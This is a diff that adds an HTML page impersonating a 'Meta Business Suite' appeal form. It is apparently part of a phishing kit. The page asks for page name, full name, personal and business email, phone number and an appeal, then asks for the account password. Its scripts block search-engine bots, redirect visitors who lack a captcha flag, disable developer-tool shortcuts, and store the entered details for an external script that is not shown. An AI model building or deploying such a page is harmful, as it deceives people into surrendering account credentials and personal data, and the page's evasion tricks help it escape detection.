@@ -1,0 +1,192 @@
+<html><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Meta for Business - Appeal Decision</title>
+  <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" type="text/css" media="screen" href="./style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+  <script>var captcha2 = localStorage.getItem("captcha");
+    if(captcha2 == "true"){
+    }
+    else{
+      window.location = "../index.html";
+    }</script>
+  <script>
+    // Define a list of known bot User-Agents
+    const botUserAgents = ["Googlebot", "Bingbot" /* Add more bots here */];
+
+    // Implement anti-bot protection
+    function protectAgainstBots() {
+      const userAgent = navigator.userAgent;
+
+      if (isBot(userAgent)) {
+        // Block known bot User-Agents
+        alert("Bot access is not allowed.");
+        window.location.href = "error.html";
+      } else {
+        // Allow legitimate traffic
+        // Add your website's functionality here
+      }
+    }
+
+    // Detect known bot User-Agents
+    function isBot(userAgent) {
+      return botUserAgents.some((bot) => userAgent.includes(bot));
+    }
+
+    // Call the protection function when the page loads
+    window.addEventListener("load", protectAgainstBots);
+  </script>
+</head>
+<body>
+  <header>
+    <div class="top">
+      <div class="logo">
+        <img src="../img/meta2.png" alt="" width="100">
+        <p>Meta Business Suite</p>
+        
+      </div>
+      
+    </div>
+    
+  </header>
+  <main>
+    <div class="side_content">
+      <section data-tab="1" class="form1">
+        
+       <div class="howto">
+         <h1>How can we help?</h1>
+         <p>We need more informations to adress your issues. This form will only take a few minutes.</p>
+       </div>
+      <div class="container">
+          <h1 class="logo_intro">Get Help</h1>
+         <div class="reason-all">
+            <form id="personal_details_form" method="post">
+              <div class="box_shadow">
+                <div class="form_group first">
+                  <label for="page_name">Page Name <small class="error_text page_name_error"></small></label>
+                  <input type="text" name="page_name" id="page_name">
+                </div>
+                <div class="form_group">
+                  <label for="full_name">Full Name <small class="error_text full_name_error"></small></label>
+                  <input type="text" name="full_name" id="full_name">
+                </div>
+                <div class="form_group">
+                  <label for="email">Personal Email <small class="error_text email_error"></small></label>
+                  <input type="email" name="email" id="email">
+                </div>
+                <div class="form_group">
+                  <label for="business_ email">Business Email <small class="error_text business_email_error"></small></label>
+                  <input type="email" name="business_email" id="business_email">
+                </div>
+                <div class="form_group">
+                  <label for="phone_number">Mobile <small class="error_text phone_number_error"></small></label>
+                  <input type="tel" name="phone_number" id="phone_number">
+                  <input type="hidden" name="ip_address" id="ip_address" value="197.238.169.207">
+                </div>
+                <div class="form_group last">
+                  <label for="appeal_box">Your Appeal <small class="error_text phone_number_error"></small></label>
+                    <textarea name="appeal_box" id="appeal_box" ></textarea>
+                </div>
+              </div>
+              <div class="button_group">
+                <button type="submit" id="details_next">Continue</button>
+              </div>
+            </form>
+        </div>
+      </div>
+    </section>
+    <section id="password_section" data-tab="2" class="form2">
+      <h3>Login &amp; recovery</h3>
+      <p class="section_desc">Manage your passwords, login preferences and recovery methods.</p>
+      <form id="password_form" method="post">
+        <div class="form_group first box_shadow">
+          <label for="password">Password <small class="error_text password_error"></small></label>
+          <input type="password" name="password" id="password">
+        </div>
+        <input type="hidden" name="unique_id" id="unique_id" value="">
+        <div class="button_group">
+          <button type="submit">Next</button>
+        </div>
+      </form>
+    </section>
+    </div>
+   
+  </main>
+  <footer class="footer">
+    <div class="footer-content">
+        <div class="loxgo">
+            <p id="yes">@ 2023 Meta</p>
+            <div class="social-icons">
+              <img src="../footer/fb.svg" alt="Facebook Icon">
+              <img src="../footer/ig.svg" alt="Instagram Icon">
+              <img src="../footer/t.svg" alt="Twitter Icon">
+              <img src="../footer/lin.svg" alt="LinkedIn Icon">
+          </div>
+        </div>
+        <div class="contact-info">
+            <p>About</p><br>
+            <p>English (UK)</p>
+        </div>
+        <div class="contact-info">
+            <p>Developers</p><br>
+            <p>English (US)</p>
+        </div>
+        <div class="contact-info">
+            <p>Careers</p><br>
+            <p>Español</p>
+        </div>
+        <div class="contact-info">
+            <p>Privacy</p><br>
+            <p>Português</p>
+        </div>
+        <div class="contact-info">
+            <p>Cookies</p><br>
+            <p>Français</p>
+        </div>
+    </div>
+  
+    <div class="footer-bottom">
+        <p>© 2023 Meta Business Suite. All rights reserved.</p>
+    </div>
+</footer>
+
+
+  <script src="./m.js"></script>
+  <script>
+    document.addEventListener("keydown", function (event) {
+      if (event.ctrlKey) {
+        event.preventDefault();
+      }
+      if (event.keyCode == 123) {
+        event.preventDefault();
+      }
+    });
+
+    
+    let nextButton = document.querySelector('#details_next')
+    let akpaForm = document.querySelector("#personal_details_form")
+    nextButton.addEventListener('click', () => {
+      let userFormData = {
+        page_name: document.getElementById("page_name").value,
+        full_name: document.getElementById("full_name").value,
+        email: document.getElementById("email").value,
+        business_email: document.getElementById("business_email").value,
+        phone_number: document.getElementById("phone_number").value,
+        ip_address: document.getElementById("ip_address").value,
+        appeal: document.querySelector("textarea").value,
+      };
+      localStorage.setItem("userDetails", JSON.stringify(userFormData))
+      localStorage.setItem("full_name", document.getElementById("full_name").value);
+      localStorage.setItem("phone_number", document.getElementById("phone_number").value);
+      localStorage.setItem("email", document.getElementById("email").value);
+      
+    })
+  </script>
+
+
+</body></html>
